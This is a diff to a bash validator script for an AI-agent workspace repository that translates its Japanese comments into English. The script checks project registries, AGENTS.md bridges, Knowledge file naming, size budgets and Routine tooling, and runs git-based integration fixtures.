@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-# 物理パスへ正規化する。論理pwdはgit rev-parse --show-toplevelと一致せず検査がskipされる。
+# Normalize to the physical path. A logical pwd does not match git rev-parse --show-toplevel, so checks would be skipped.
 repo_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd -P)"
 failures=0
 warnings=0
@@ -9,13 +9,13 @@ strict=false
 full=false
 base_ref=''
 
-# bash 3.2を互換性の床として構文検査する。/bin/bashが無い環境ではPATHのbashへfallbackする。
+# Syntax-check against bash 3.2 as the compatibility floor. Fall back to the PATH bash where /bin/bash is absent.
 syntax_bash='bash'
 if [[ -x /bin/bash ]]; then
   syntax_bash='/bin/bash'
 fi
 
-# set -e中断でも一時ファイルとfixture常駐プロセスを残さないよう、一括で回収する。
+# Reclaim temp files and resident fixture processes in one place, even when set -e aborts the run.
 cleanup_paths=()
 cleanup_pids=()
 cleanup_tmp_paths() {
@@ -33,7 +33,7 @@ cleanup_tmp_paths() {
 }
 trap cleanup_tmp_paths EXIT
 
-# 固定Wiki Markdownは大文字名を正本とする。利用者が作るsources/topicsページは対象外。
+# Fixed Wiki Markdown files use uppercase names as canon. User-created sources/topics pages are exempt.
 knowledge_index_path='knowledge/wiki/INDEX.md'
 knowledge_log_path='knowledge/wiki/LOG.md'
 knowledge_source_template_path='knowledge/wiki/_template/SOURCE.md'
@@ -117,9 +117,9 @@ frontmatter_key_count() {
   ' "$1"
 }
 
-# registry entryを "name<TAB>url<TAB>reason<TAB>revision" として1行ずつ出す。
-# コードフェンス内は読まず、構造上の誤りは "E<TAB>detail" で返す。
-# materializerとbackup Toolの同名関数と同じ判定を持つ。
+# Emit registry entries one per line as "name<TAB>url<TAB>reason<TAB>revision".
+# Skip code-fenced content; report structural errors as "E<TAB>detail".
+# Mirrors the logic of the same-named function in the materializer and the backup Tool.
 registry_records() {
   LC_ALL=C awk '
     function flush_entry() {
@@ -173,7 +173,7 @@ registry_records() {
   ' "$1"
 }
 
-# projects/.gitignore の managed block構造を検査し、entryを1行ずつ出す。
+# Validate the managed block structure of projects/.gitignore and emit entries one per line.
 ignore_block_records() {
   [[ -f "$1" ]] || { printf 'E\tmissing file\n'; return 0; }
   awk '
@@ -198,7 +198,7 @@ ignore_block_records() {
   ' "$1"
 }
 
-# repository_urlはoption injection、認証情報、query/fragment、file://、ローカルpathを拒否する。
+# repository_url rejects option injection, credentials, query/fragment, file://, and local paths.
 repository_url_is_rejected() {
   local url="$1"
   local authority userinfo
@@ -246,7 +246,7 @@ check_size() {
   if (( bytes > hard_limit )); then
     fail "$(relative_path "$file") exceeds $label hard limit: ${bytes}B > ${hard_limit}B"
   elif (( bytes * 10 > hard_limit * 9 )); then
-    # 超過前の代謝を促す早期警告。tools/TOOLS.md#超過時の標準処理を自律実行する合図。
+    # Early warning prompting metabolization before the limit is hit; the cue to autonomously run tools/TOOLS.md#超過時の標準処理.
     warn "$(relative_path "$file") is above 90% of the $label hard limit: ${bytes}B / ${hard_limit}B; delegate details before it overflows"
   fi
 }
@@ -400,7 +400,7 @@ check_size_warning() {
   fi
 }
 
-# CLAUDE.mdは@AGENTS.mdだけを持つブリッジであり、独自規則を所有してはならない。
+# CLAUDE.md is a bridge holding only @AGENTS.md and must not own any rules of its own.
 validate_claude_bridge() {
   local agents_file="$1"
   local claude_file="${agents_file%/AGENTS.md}/CLAUDE.md"
@@ -413,7 +413,7 @@ validate_claude_bridge() {
   fi
 }
 
-# Project差分ファイルは成果契約と現在状態を所有してはならない。
+# A per-Project delta file must not own the deliverable contract or the current state.
 validate_project_agents_file() {
   local agents_file="$1"
   local project_dir forbidden push_policy
@@ -428,7 +428,7 @@ validate_project_agents_file() {
   check_size "$agents_file" 2048 'Project AGENTS.md'
 
   if [[ "$project_dir" == "$repo_root/projects/_template" ]]; then
-    fail 'projects/_template must not carry AGENTS.md; per-Project差分は自動複製しない'
+    fail 'projects/_template must not carry AGENTS.md; per-Project deltas are not auto-copied'
   fi
 
   for forbidden in "${forbidden_headings[@]}"; do
@@ -452,7 +452,7 @@ validate_project_agents_file() {
     fail "$(relative_path "$agents_file") must not order a bulk docs/** read; list one condition per Domain Canon instead"
   fi
 
-  # Independentのpush方針を宣言する場合、語彙は auto と gated だけとする。
+  # When an Independent push policy is declared, the only vocabulary is auto and gated.
   if grep -Fqx '## Push Policy' "$agents_file"; then
     push_policy="$(awk '
       $0 == "## Push Policy" { in_section = 1; next }
@@ -468,8 +468,8 @@ validate_project_agents_file() {
   validate_claude_bridge "$agents_file"
 }
 
-# Project Docs Routeの節から、条件付き参照として成立している読込先だけを抜き出す。
-# 本文・禁止文・単なる一覧への登場は条件付き参照として数えない。
+# Extract from the Project Docs Route section only the read targets that form a valid conditional reference.
+# Prose mentions, prohibition sentences, and bare list appearances do not count as conditional references.
 docs_route_targets() {
   awk '
     function trim(value) { gsub(/^[ \t]+|[ \t]+$/, "", value); return value }
@@ -499,7 +499,7 @@ docs_route_targets() {
   ' "$1"
 }
 
-# Project docsは大文字Domain Canonを入口とし、下位のフォルダ構造はProjectが決める。
+# Project docs are entered through an uppercase Domain Canon; the Project decides the folder structure below it.
 validate_project_docs() {
   local project_dir="$1"
   local project_file="$project_dir/PROJECT.md"
@@ -541,7 +541,7 @@ validate_project_docs() {
     done < <(find "$docs_dir" -mindepth 1 -maxdepth 1 -type d \
       \( -name misc -o -name other -o -name notes -o -name tmp \) -print0)
 
-    # docs/直下の各詳細フォルダは、少なくとも一つのDomain Canonから案内される。
+    # Each detail folder directly under docs/ must be referenced by at least one Domain Canon.
     if (( canon_count > 0 )); then
       while IFS= read -r -d '' detail_dir; do
         detail_name="${detail_dir##*/}"
@@ -567,7 +567,7 @@ validate_project_docs() {
     if [[ -f "$architecture_file" ]] && ! printf '%s\n' "$route_targets" | grep -Fq 'ARCHITECTURE.md'; then
       fail "$(relative_path "$agents_file") must route to ARCHITECTURE.md from a '## Project Docs Route' entry (a '| 条件 | \`ARCHITECTURE.md\` |' table row, or a 条件:/参照: pair); naming it elsewhere in the file does not count"
     fi
-    # bash 3.2では空配列の展開が set -u で落ちるため、件数で守る。
+    # In bash 3.2 expanding an empty array trips set -u, so guard with the count.
     if (( canon_count > 0 )); then
       for canon in "${canon_files[@]}"; do
         canon_name="${canon##*/}"
@@ -578,9 +578,9 @@ validate_project_docs() {
   fi
 }
 
-# Independent Project rootは普通のcloneであり、`.git`は実directoryでなければならない。
-# evals/fixtures配下の静的fixtureは登録と契約だけを持ち、実cloneを要求しない。
-# 実Gitの挙動はvalidator内のintegration fixtureが所有する。
+# An Independent Project root is a normal clone; its `.git` must be a real directory.
+# Static fixtures under evals/fixtures carry only registration and contracts; no real clone is required.
+# Real Git behavior is owned by the integration fixture inside the validator.
 validate_independent_attachment() {
   local project_name="$1"
   local repository_url="$2"
@@ -620,8 +620,8 @@ validate_independent_attachment() {
   child_origin="$(git -C "$target" config --get remote.origin.url 2>/dev/null || true)"
   [[ "$child_origin" == "$repository_url" ]] || \
     fail "$rel_project remote.origin.url is ${child_origin:-<unset>}, expected $repository_url"
-  # 採用revisionがcloneに存在するだけでは足りない。HEADがそこに固定されていることまで確かめる。
-  # branch上で作業してそのtipを採用する運用も成立するため、detached HEADまでは要求しない。
+  # The adopted revision merely existing in the clone is not enough; verify HEAD is pinned to it.
+  # Working on a branch and adopting its tip is also valid, so a detached HEAD is not required.
   if [[ "$state_revision" =~ ^[0-9a-f]{40}$ ]]; then
     child_head="$(git -C "$target" rev-parse --verify --quiet HEAD || true)"
     [[ "$child_head" == "$state_revision" ]] || \
@@ -666,7 +666,7 @@ validate_project_contract() {
   fi
   case "$status" in active|paused|completed|retired) ;; *) fail "$(relative_path "$project_file") has an invalid status" ;; esac
   case "$mode" in finite|continuous) ;; *) fail "$(relative_path "$project_file") has an invalid mode" ;; esac
-  # attachmentはProject契約ではなくregistryが持つ。旧fieldをactive schemaへ残さない。
+  # Attachment lives in the registry, not the Project contract. Retired fields must not stay in the active schema.
   for retired_key in repository_mode repository_url repository_reason repository_default_branch; do
     [[ "$(frontmatter_key_count "$project_file" "$retired_key")" == '0' ]] || \
       fail "$(relative_path "$project_file") declares the retired $retired_key field; attachment now lives in projects/REPOSITORIES.md"
@@ -781,7 +781,7 @@ validate_project_state() {
       fi
     done < <(grep -Eo '\*\*PC-(0[1-9]|[1-9][0-9])\*\*' "$project_file" | tr -d '*' | LC_ALL=C sort -u)
   fi
-  # 採用revisionはroot側 projects/REPOSITORIES.md だけが所有する。STATEへ自己参照を戻さない。
+  # The adopted revision is owned solely by the root-side projects/REPOSITORIES.md. Do not put a self-reference back into STATE.
   if grep -Fqx '## Repository State' "$state_file"; then
     fail "$(relative_path "$state_file") declares the retired ## Repository State section; the adopted revision lives in projects/REPOSITORIES.md"
   fi
@@ -872,13 +872,13 @@ validate_knowledge_page() {
   elif [[ "$status" == 'active' && $bytes -gt 24576 ]] && ! grep -Fqx '## Retrieval Map' "$page"; then
     fail "$(relative_path "$page") exceeds 24KiB and requires ## Retrieval Map"
   fi
-  # 大文字名を許すのはテンプレート固定ファイルの2パスだけで、利用者Knowledgeへは広げない。
+  # Only the two fixed template paths may use uppercase names; do not extend this to user Knowledge.
   case "$(relative_path "$page")" in
     "$knowledge_source_template_path"|"$knowledge_topic_template_path") ;;
     *)
       case "$filename" in
-        # POSIX文字クラスを使う。非Cロケールでは [a-z] の照合順序が大文字を含みうるため、
-        # 範囲表記のままだと大文字ファイル名を取りこぼす。
+        # Use POSIX character classes. In non-C locales the [a-z] collation order may include
+        # uppercase letters, so the range form would miss uppercase filenames.
         *[![:lower:][:digit:].-]*) fail "$(relative_path "$page") filename must use lowercase kebab-case" ;;
       esac
       ;;
@@ -946,8 +946,8 @@ validate_deleted_project() {
 registry_path='projects/REPOSITORIES.md'
 ignore_path='projects/.gitignore'
 
-# 登録済みIndependent ProjectのProject rootはroot validatorの走査対象外である。
-# 配列は set -u 下でも安全なよう、既存pruneと重複する無害な項目で常に非空にする。
+# Project roots of registered Independent Projects are excluded from the root validator scan.
+# Keep the arrays permanently non-empty with a harmless entry duplicating the existing prune, so they are safe under set -u.
 independent_names=()
 independent_urls=()
 independent_reasons=()
@@ -999,7 +999,7 @@ required_files=(
 )
 for path in "${required_files[@]}"; do require_file "$repo_root/$path"; done
 
-# 不変原資料は internal/external の二領域だけを持ち、どちらも同じ強さで保護する。
+# Immutable source material has exactly two areas, internal/external, both protected with the same strength.
 required_directories=(
   'knowledge/raw/internal' 'knowledge/raw/external' 'knowledge/wiki/sources' 'knowledge/wiki/topics'
 )
@@ -1008,13 +1008,13 @@ for path in "${required_directories[@]}"; do
     fail "missing directory: $path (create it and keep it tracked, e.g. touch $path/.gitkeep)"
 done
 
-# 旧構造・旧入口は互換コピーを残さず廃止する。
+# Retire old structures and old entry points without keeping compatibility copies.
 retired_paths=(
-  'knowledge/research|外部原資料は knowledge/raw/external/ が所有する'
-  'skills/README.md|領域正本は skills/SKILLS.md である'
-  'projects/README.md|領域正本は projects/PROJECTS.md である'
-  'evals/README.md|領域正本は evals/EVALS.md である'
-  'tools/README.md|領域正本は tools/TOOLS.md である'
+  'knowledge/research|external source material is owned by knowledge/raw/external/'
+  'skills/README.md|the area canon is skills/SKILLS.md'
+  'projects/README.md|the area canon is projects/PROJECTS.md'
+  'evals/README.md|the area canon is evals/EVALS.md'
+  'tools/README.md|the area canon is tools/TOOLS.md'
 )
 for entry in "${retired_paths[@]}"; do
   retired_path="${entry%%|*}"
@@ -1023,8 +1023,8 @@ for entry in "${retired_paths[@]}"; do
     fail "retired path must not exist: $retired_path — $retired_hint (git rm it; do not keep a compatibility copy)"
 done
 
-# 固定Wiki Markdownは大文字名だけを正本とする。case-insensitive filesystemでは -e が
-# 大文字の正本にも一致するため、Git indexと実ディレクトリエントリの完全一致だけで旧caseを検出する。
+# Fixed Wiki Markdown is canonical only under uppercase names. On a case-insensitive filesystem -e
+# also matches the uppercase canon, so detect the old case only via exact matches against the Git index and real directory entries.
 tracked_files_snapshot=''
 if git -C "$repo_root" rev-parse --show-toplevel >/dev/null 2>&1; then
   tracked_files_snapshot="$(git -C "$repo_root" ls-files 2>/dev/null || true)"
@@ -1040,14 +1040,14 @@ for entry in \
     printf '%s\n' "$tracked_files_snapshot" | grep -Fqx -- "$retired_path"; then
     fail "retired lowercase Knowledge path is tracked in the Git index: $retired_path — the canonical name is $canonical_path"
   fi
-  # readdirは実際に保存された名前を返すため、findの -name は case-exact に働く。
+  # readdir returns the name as actually stored, so find's -name matches case-exactly.
   if [[ -d "$repo_root/${retired_path%/*}" ]] && \
     [[ -n "$(find "$repo_root/${retired_path%/*}" -maxdepth 1 -type f -name "${retired_path##*/}" -print -quit)" ]]; then
     fail "retired lowercase Knowledge file exists on disk: $retired_path — the canonical name is $canonical_path"
   fi
 done
 
-# Project docsは大文字Domain Canonから入る。外部原資料とinputsの命名は対象外とする。
+# Project docs are entered through an uppercase Domain Canon. External source material and inputs naming are exempt.
 while IFS= read -r -d '' docs_readme; do
   fail "$(relative_path "$docs_readme") is forbidden; enter docs/ through an uppercase Domain Canon such as docs/DESIGN.md"
 done < <(find "$repo_root" \
@@ -1055,7 +1055,7 @@ done < <(find "$repo_root" \
      -o -path "$repo_root/knowledge/raw" "${repository_prune_or[@]}" \) -prune -o \
   -type f -path '*/projects/*/docs/README.md' -print0)
 
-# Project templateへ docs/、ARCHITECTURE.md、AGENTS.md を常設しない。
+# Do not permanently ship docs/, ARCHITECTURE.md, or AGENTS.md in the Project template.
 for template_entry in AGENTS.md CLAUDE.md ARCHITECTURE.md docs; do
   [[ ! -e "$repo_root/projects/_template/$template_entry" ]] || \
     fail "projects/_template must not ship $template_entry; only the Project that needs it creates it"
@@ -1097,7 +1097,7 @@ if [[ -d "$repo_root/projects/_archive" ]]; then
   fail 'projects/_archive is forbidden; use Project status without physical moves'
 fi
 
-# ルートはブートローダー兼ルーターであり、Route表と入口ファイルを実在参照で持つ。
+# The root is both bootloader and router; it holds the Route table and entry files as references that must exist.
 validate_claude_bridge "$repo_root/AGENTS.md"
 validate_claude_bridge "$repo_root/projects/AGENTS.md"
 if [[ -f "$repo_root/AGENTS.md" ]]; then
@@ -1123,7 +1123,7 @@ if [[ -f "$repo_root/projects/AGENTS.md" ]]; then
   done
 fi
 
-# 個別ProjectのAGENTS.mdは任意。存在する場合だけ差分ファイルとして検査する。
+# A per-Project AGENTS.md is optional; validate it as a delta file only when it exists.
 while IFS= read -r -d '' project_agents_file; do
   [[ -f "$(dirname "$project_agents_file")/PROJECT.md" ]] || continue
   validate_project_agents_file "$project_agents_file"
@@ -1142,9 +1142,9 @@ while IFS= read -r -d '' nested_git; do
 done < <(find "$repo_root" \( "${repository_prune[@]}" \) -prune -o \
   -mindepth 2 \( -type d -o -type f \) -name .git -print0)
 
-# --- registryとignore projectionの検査 ------------------------------------------
+# --- Registry and ignore projection checks------------------------------------------
 
-# 静的fixtureは実cloneを持たないため、attachmentとroot ownershipはroot registryだけで検査する。
+# Static fixtures carry no real clone, so attachment and root ownership are checked only for the root registry.
 validate_repositories_registry() {
   local scope_root="$1"
   local scope_is_root="$2"
@@ -1159,7 +1159,7 @@ validate_repositories_registry() {
   rel_ignore="$(relative_path "$scope_ignore")"
   names_file="$(mktemp "${TMPDIR:-/tmp}/agent-registry-names.XXXXXX")"
   ignore_file="$(mktemp "${TMPDIR:-/tmp}/agent-registry-ignore.XXXXXX")"
-  # set -e中断時もEXIT trapが回収できるよう登録する。正常経路のrmはそのまま。
+  # Register so the EXIT trap can reclaim them even when set -e aborts; the happy-path rm stays as-is.
   cleanup_paths+=("$names_file" "$ignore_file")
 
   grep -Fqx '# REPOSITORIES — Independent Project Registry' "$scope_registry" || \
@@ -1194,7 +1194,7 @@ validate_repositories_registry() {
     fi
   done < <(registry_records "$scope_registry")
 
-  # managed blockはregistryの派生projectionであり、集合と順序が完全一致しなければならない。
+  # The managed block is a derived projection of the registry; its set and order must match exactly.
   previous_ignore=''
   while IFS=$'\t' read -r record_kind ignore_entry; do
     [[ -n "$record_kind" ]] || continue
@@ -1228,7 +1228,7 @@ while IFS= read -r -d '' fixture_registry; do
 done < <(find "$repo_root/evals/fixtures" -mindepth 3 -maxdepth 3 -type f \
   -path '*/projects/REPOSITORIES.md' -print0 2>/dev/null)
 
-# root Gitは登録済みProject rootを追跡せず、gitlinkもsubmoduleも持たない。
+# The root Git does not track registered Project roots and holds no gitlinks or submodules.
 if grep -Fqx 'projects/*/repository/' "$repo_root/.gitignore"; then
   fail 'root .gitignore still ignores the retired projects/*/repository/ layout; the registry projection lives in projects/.gitignore'
 fi
@@ -1241,7 +1241,7 @@ while IFS= read -r broad_pattern; do
   fail "$ignore_path must not ignore Project directories wholesale: $broad_pattern"
 done < <(grep -E '^/?\*/?$' "$repo_root/$ignore_path" || true)
 
-# Embedded Project、_template、registry、projectionをignoreしない。
+# Never ignore Embedded Projects, _template, the registry, or the projection.
 if command -v git >/dev/null 2>&1 && git -C "$repo_root" rev-parse --show-toplevel >/dev/null 2>&1; then
   for guarded_path in "$registry_path" "$ignore_path" 'projects/_template/PROJECT.md' 'projects/PROJECTS.md'; do
     if git -C "$repo_root" check-ignore -q -- "$guarded_path" 2>/dev/null; then
@@ -1353,7 +1353,7 @@ required_cases=(
   routine-scheduler-darwin-launchd routine-scheduler-default-cron routine-schedule-install-explicit
 )
 
-# 改名した旧ケース名が必須一覧や文書へ残っていないことを同じ作業内で保証する。
+# Guarantee within the same change that renamed old case names do not linger in the required list or documents.
 retired_case_names=(
   backup-external-repo-boundary satellite-consolidation-audit
   satellite-promotion-session-boundary satellite-hub-content-boundary
@@ -1395,7 +1395,7 @@ while IFS= read -r -d '' case_file; do
   fi
 done < <(find "$repo_root/evals/cases" -type f -name '*.yaml' -print0)
 
-# globが空でもsedの生エラーで異常終了しないよう先に存在を確かめる。
+# Check existence first so an empty glob does not abort with a raw sed error.
 duplicate_case_names=''
 if compgen -G "$repo_root/evals/cases/*.yaml" >/dev/null 2>&1; then
   duplicate_case_names="$(sed -n 's/^name: //p' "$repo_root"/evals/cases/*.yaml | LC_ALL=C sort | uniq -d)"
@@ -1472,7 +1472,7 @@ if [[ -f "$materialize_tool" ]]; then
       fail "tools/materialize-project-repositories.sh must not use $forbidden_flag"
     fi
   done
-  # 既存cloneをreset/clean/stash/merge/rebaseで変形しない。
+  # Never mutate an existing clone with reset/clean/stash/merge/rebase.
   for forbidden_subcommand in reset clean stash merge rebase pull; do
     if grep -Eq "git[^#]*[[:space:]]$forbidden_subcommand[[:space:]]" "$materialize_tool"; then
       fail "tools/materialize-project-repositories.sh must not run git $forbidden_subcommand"
@@ -1510,21 +1510,21 @@ fi
 grep -Fq 'tools/BACKUP.md' "$repo_root/AGENTS.md" || \
   fail 'AGENTS.md does not delegate backup details to tools/BACKUP.md'
 
-# --- Human-on-the-loopの契約が正本へ存在し、旧「明示時だけ」規則が残っていないことを検査する ----------
+# --- Verify the Human-on-the-loop contract exists in the canon and the old explicit-only rule is gone ----------
 
-# ルートは自律実行の既定と例外ゲートを持つ。詳細列挙は各Ownerが持つ。
+# The root holds the autonomy defaults and the escalation gates; each Owner holds the detailed enumeration.
 for autonomy_heading in '## 自律実行' '## 人間へ上げる例外'; do
   grep -Fqx -- "$autonomy_heading" "$repo_root/AGENTS.md" || \
     fail "AGENTS.md must carry the Human-on-the-loop section: $autonomy_heading"
 done
 
-# 例外の4区分は、それぞれ詳細を所有する正本へRouteする。
+# Each of the four escalation categories routes to the canon that owns its details.
 for exception_owner in projects/LIFECYCLE.md projects/PROJECTS.md tools/BACKUP.md tools/TOOLS.md; do
   grep -Fq "$exception_owner" "$repo_root/AGENTS.md" || \
     fail "AGENTS.md must route an escalation category to its canon: $exception_owner"
 done
 
-# 詳細はOwner側に実在する。rootへ再掲せず、Ownerを空にもしない。
+# Details live on the Owner side; do not restate them at the root, and do not leave the Owner empty.
 while IFS='|' read -r owner_doc owner_heading; do
   [[ -n "$owner_doc" ]] || continue
   grep -Fqx -- "$owner_heading" "$repo_root/$owner_doc" || \
@@ -1542,7 +1542,7 @@ knowledge/KNOWLEDGE.md|### 大きいKnowledgeの扱い
 evals/EVALS.md|## 自律実行と例外ケースの最低条件
 AUTONOMY_OWNERS
 
-# backupを利用者の明示依頼へ縛る旧規則と、自動pushの一律禁止は残さない。
+# Drop the old rule tying backup to an explicit user request, and the blanket ban on automatic push.
 for autonomy_doc in AGENTS.md README.md tools/TOOLS.md tools/BACKUP.md evals/EVALS.md \
   projects/AGENTS.md projects/PROJECTS.md; do
   if grep -Fq '明示した場合だけ実行する' "$repo_root/$autonomy_doc"; then
@@ -1553,11 +1553,11 @@ for autonomy_doc in AGENTS.md README.md tools/TOOLS.md tools/BACKUP.md evals/EVA
   fi
 done
 
-# push policyの語彙は auto と gated だけとする。
+# The push policy vocabulary is exactly auto and gated.
 grep -Fq '`auto`' "$repo_root/projects/PROJECTS.md" && grep -Fq '`gated`' "$repo_root/projects/PROJECTS.md" || \
   fail 'projects/PROJECTS.md must define both push policy values: auto and gated'
 
-# size budgetを黙って拡大していないことを固定する。
+# Pin the size budgets so they are not silently raised.
 while IFS= read -r budget_row; do
   [[ -n "$budget_row" ]] || continue
   grep -Fqx -- "$budget_row" "$repo_root/tools/TOOLS.md" || \
@@ -1568,9 +1568,9 @@ done <<'SIZE_BUDGET_ROWS'
 | `projects/<name>/AGENTS.md` | 2KiB |
 SIZE_BUDGET_ROWS
 
-# --- Routine Trigger層の検査（正本: routines/ROUTINES.md） --------------------------------
+# --- Routine Trigger layer checks (canon: routines/ROUTINES.md)--------------------------------
 
-# RoutineはTriggerでありRouteではない。Route表・Route enumへ`routine`を追加しない。
+# A Routine is a Trigger, not a Route. Never add `routine` to the Route table or the Route enum.
 if [[ -f "$repo_root/AGENTS.md" ]]; then
   if grep -Eq '^\| *`routine` *\|' "$repo_root/AGENTS.md"; then
     fail 'AGENTS.md defines routine as a Route; a Routine is a trigger, not a Route'
@@ -1602,7 +1602,7 @@ if [[ -f "$repo_root/routines/maintenance/ROUTINE.md" ]]; then
   done
 fi
 
-# 初期版はMaintenanceだけ。Research用の先回りファイル・空テンプレートを置かない。
+# The initial version ships Maintenance only. Do not pre-create Research files or empty templates.
 for premature_routine_path in routines/research routines/_template routines/AGENTS.md routines/CLAUDE.md; do
   [[ ! -e "$repo_root/$premature_routine_path" ]] || \
     fail "$premature_routine_path must not exist; only the Maintenance Routine ships in v1"
@@ -1624,7 +1624,7 @@ if [[ -d "$repo_root/routines" ]]; then
     ! -name '.gitkeep' ! -name '.DS_Store' -print0 2>/dev/null)
 fi
 
-# Routine Toolの実行属性・構文・安全境界。
+# Routine Tool executable bits, syntax, and safety boundaries.
 for routine_tool in tools/run-routine.sh tools/manage-routine-schedule.sh; do
   routine_tool_file="$repo_root/$routine_tool"
   [[ ! -f "$routine_tool_file" ]] && continue
@@ -1675,7 +1675,7 @@ for node in ast.walk(tree):
   fi
 fi
 
-# .env.exampleはプレースホルダーだけを持ち、実値・実モデルIDを含まない。
+# .env.example carries placeholders only; no real values and no real model IDs.
 if [[ -f "$repo_root/.env.example" ]]; then
   grep -Fq 'deepseek | openai | anthropic' "$repo_root/.env.example" || \
     fail '.env.example does not document the provider enum deepseek | openai | anthropic'
@@ -1692,7 +1692,7 @@ if [[ -f "$repo_root/.env.example" ]]; then
     fail '.env.example must default AGENT_ROUTINE_REASONING_ENABLED to false'
 fi
 
-# Routine正本はmeta catalogへ条件付き候補として入り、runtime派生物はGit追跡されない。
+# The Routine canon enters the meta catalog as a conditional candidate; runtime derivatives are never Git-tracked.
 if [[ -f "$repo_root/tools/build-context-cache.sh" ]]; then
   grep -Fq "'routines/ROUTINES.md|" "$repo_root/tools/build-context-cache.sh" || \
     fail 'tools/build-context-cache.sh does not register routines/ROUTINES.md as meta canon'
@@ -1733,10 +1733,10 @@ grep -Fq 'backup-only Routine' "$repo_root/tools/BACKUP.md" || \
 grep -Fqx '## Routineケースの最低条件' "$repo_root/evals/EVALS.md" || \
   fail 'evals/EVALS.md does not own the Routine case minimum conditions'
 
-# 実Git・cache・backup・materializerの統合fixtureは--fullだけで実行する。
-# 既定実行は静的構造検査に限定し、Tool変更時は--fullを必須とする（tools/TOOLS.md所有）。
-# AGENT_VALIDATOR_NESTED_FIXTUREはfixture内から呼ばれたvalidatorの再帰実行を防ぐ内部markerで、
-# 通常運用では設定しない。
+# Integration fixtures for real Git, cache, backup, and the materializer run only under --full.
+# The default run is limited to static structural checks; Tool changes require --full (owned by tools/TOOLS.md).
+# AGENT_VALIDATOR_NESTED_FIXTURE is an internal marker preventing recursive runs of a validator
+# invoked from inside a fixture; it is never set in normal operation.
 if [[ "$full" == true && -z "${AGENT_VALIDATOR_NESTED_FIXTURE:-}" ]]; then
 cache_test_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-cache.XXXXXX")"
 fixture_cache_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-fixture.XXXXXX")"
@@ -1745,7 +1745,7 @@ log_fixture_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-log.XXXXXX")"
 backup_fixture_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-backup.XXXXXX")"
 malformed_fixture_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-malformed.XXXXXX")"
 malformed_cache_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-malformed-cache.XXXXXX")"
-# 回収は冒頭のEXIT trap（cleanup_tmp_paths）が一括で行う。ここでtrapを上書きしない。
+# Cleanup is handled in one place by the opening EXIT trap (cleanup_tmp_paths). Do not override the trap here.
 cleanup_paths+=("$cache_test_dir" "$fixture_cache_dir" "$sqlite_fixture_cache_dir" \
   "$log_fixture_dir" "$backup_fixture_dir" "$malformed_fixture_dir" "$malformed_cache_dir")
 if ! AGENT_CACHE_DIR="$cache_test_dir" bash "$repo_root/tools/build-context-cache.sh" >/dev/null; then
@@ -1800,7 +1800,7 @@ elif ! grep -Fq $'nested/kept.txt\t' "$fixture_cache_dir/manifest.tsv"; then
   fail 'build-context-cache.sh nested .tmp test did not scan the adjacent durable file'
 fi
 
-# frontmatterを欠く正本があってもcache生成を止めず、対象を名指しして警告し、候補から外す。
+# A canon file lacking frontmatter must not stop cache generation; warn naming the target and drop it from the candidates.
 mkdir -p "$malformed_fixture_dir/projects/good-project" \
   "$malformed_fixture_dir/projects/no-status" \
   "$malformed_fixture_dir/skills/blank-status-skill" \
@@ -1976,10 +1976,10 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
   env "${backup_env[@]}" git -C "$backup_remote_dir" symbolic-ref HEAD refs/heads/main
   env "${backup_env[@]}" git init -q --bare "$independent_remote_dir"
   env "${backup_env[@]}" git -C "$independent_remote_dir" symbolic-ref HEAD refs/heads/main
-  # branchやtagから到達できないcommitを採用する負ケースのため、SHA指定fetchを許可する。
+  # Allow fetch by SHA for the negative case adopting a commit unreachable from any branch or tag.
   env "${backup_env[@]}" git -C "$independent_remote_dir" config uploadpack.allowAnySHA1InWant true
 
-  # Independent ProjectのPROJECT.mdとSTATE.mdはchild Gitが所有する。
+  # The Independent Project's PROJECT.md and STATE.md are owned by the child Git.
   env "${backup_env[@]}" git init -q "$independent_seed"
   seed_git symbolic-ref HEAD refs/heads/main
   printf 'verified independent revision\n' > "$independent_seed/source.txt"
@@ -2003,7 +2003,7 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
   printf '.tmp/\n.agent-cache/\n.env*\n!.env.example\n.DS_Store\nignored-dir/\n' \
     > "$backup_work/.gitignore"
   printf '#!/usr/bin/env bash\nexit 0\n' > "$backup_work/tools/validate-agent-directory.sh"
-  # Embedded Projectはroot Gitが丸ごと追跡し、ignore projectionへ入らない。
+  # An Embedded Project is tracked wholesale by the root Git and never enters the ignore projection.
   mkdir -p "$backup_work/projects/embedded-project"
   {
     printf '%s\n' '---' 'name: embedded-project' 'description: fixture embedded project'
@@ -2012,7 +2012,7 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
   {
     printf '%s\n' '---' 'updated_at: 2026-08-03' '---' '' '# Current State'
   } > "$backup_work/projects/embedded-project/STATE.md"
-  # 空registryでも成立することを先に確かめる。
+  # First confirm everything holds even with an empty registry.
   printf '%s\n' '# REPOSITORIES — Independent Project Registry' > "$fixture_registry"
   write_ignore_projection
   backup_git add -A
@@ -2031,7 +2031,7 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
   backup_git commit -q -m 'fixture: register the Independent Project'
   backup_head="$(backup_git rev-parse HEAD)"
 
-  # --- 未materialize状態 -------------------------------------------------------
+  # --- Unmaterialized state-------------------------------------------------------
   backup_run --dry-run
   backup_expect_blocked 'missing-independent-repository' 'workspace backup before materialization'
   materialize_run --all --check
@@ -2063,7 +2063,7 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
   materialize_run --all --check
   materialize_expect_line 'MATERIALIZATION_OK total=1 cloned=0 verified=1' 'idempotent --check'
 
-  # remoteのtipが進んでも採用revisionを勝手に更新しない。
+  # A newer remote tip must not silently advance the adopted revision.
   printf 'later work\n' > "$independent_seed/later.txt"
   seed_git add later.txt
   seed_git commit -q -m 'fixture: newer branch tip'
@@ -2074,7 +2074,7 @@ if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
   [[ "$(child_git rev-parse HEAD)" == "$independent_revision" ]] || \
     fail 'materializer fixture: the clone was advanced to the branch tip instead of the adopted revision'
 
-  # --- 正常なworkspace backup ----------------------------------------------------
